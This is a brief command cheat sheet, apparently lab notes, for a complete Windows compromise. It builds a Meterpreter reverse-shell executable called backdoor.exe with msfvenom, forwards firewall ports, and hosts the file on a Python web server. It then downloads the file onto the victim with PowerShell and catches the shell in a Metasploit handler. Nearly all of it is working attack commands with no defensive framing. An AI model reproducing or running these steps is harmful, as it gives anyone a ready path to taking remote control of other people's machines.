#attacker
#create reverse shell malware
sudo msfvenom -p windows/meterpreter/reverse_tcp_allports LHOST=10.0.31.200 LPORT=4444 -f exe > backdoor.exe

#open linux firewall ports
sudo iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 4444:6010 -j DNAT --to-destination 10.0.31.200:4444
sudo iptables --table nat --list

#share malware with simpleweb
sudo python -m SimpleHTTPServer 80


#victim
Powershell.exe
iwr -UseBasicParsing -Uri 'http://10.0.31.200/backdoor.exe' -OutFile 'C:\Users\Administrator\Desktop\backdoor.exe'

or browse to ip


#attacker - reverse shell
sudo msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp_allports
set LHOST 10.0.31.200
set LPORT 4444
exploit

#victim
execute backdoor.exe